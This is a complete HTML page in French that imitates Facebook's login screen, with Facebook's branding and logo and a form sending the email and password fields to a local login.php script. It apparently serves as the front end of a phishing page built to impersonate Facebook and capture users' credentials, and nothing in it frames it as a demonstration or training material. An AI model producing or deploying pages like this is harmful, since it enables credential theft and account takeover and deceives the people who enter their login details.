<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Facebook – Connexion ou inscription</title>
  <style>
    /* Reset basique */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      padding-top: 50px;
      color: #1c1e21;
    }

    header {
      width: 100%;
      max-width: 980px;
      display: flex;
      align-items: center;
      margin-bottom: 40px;
      padding: 0 20px;
    }

    header img {
      height: 48px;
      margin-right: 15px;
    }

    header h1 {
      font-size: 32px;
      color: #1877f2;
      font-weight: 700;
      user-select: none;
    }

    .login-container {
      background: white;
      padding: 20px 30px;
      box-shadow: 0 2px 8px rgb(0 0 0 / 0.2);
      border-radius: 8px;
      width: 360px;
    }

    .login-container h2 {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 20px;
      color: #1c1e21;
      user-select: none;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      padding: 14px 12px;
      margin-bottom: 16px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      transition: border-color 0.2s ease;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #1877f2;
      box-shadow: 0 0 5px #1877f2aa;
    }

    button {
      background-color: #1877f2;
      border: none;
      padding: 14px;
      color: white;
      font-weight: 700;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      user-select: none;
    }

    button:hover {
      background-color: #165ec9;
    }

    .forgot-pass {
      margin-top: 12px;
      font-size: 14px;
      color: #1877f2;
      text-align: center;
      cursor: pointer;
      user-select: none;
      text-decoration: none;
    }

    .forgot-pass:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook logo" />
    <h1>Facebook</h1>
  </header>

  <div class="login-container">
    <h2>Connexion</h2>
    <form action="login.php" method="POST">
      <input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required autofocus />
      <input type="password" name="pass" placeholder="Mot de passe" required />
      <button type="submit">Se connecter</button>
    </form>
    <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
  </div>
</body>
  </html>
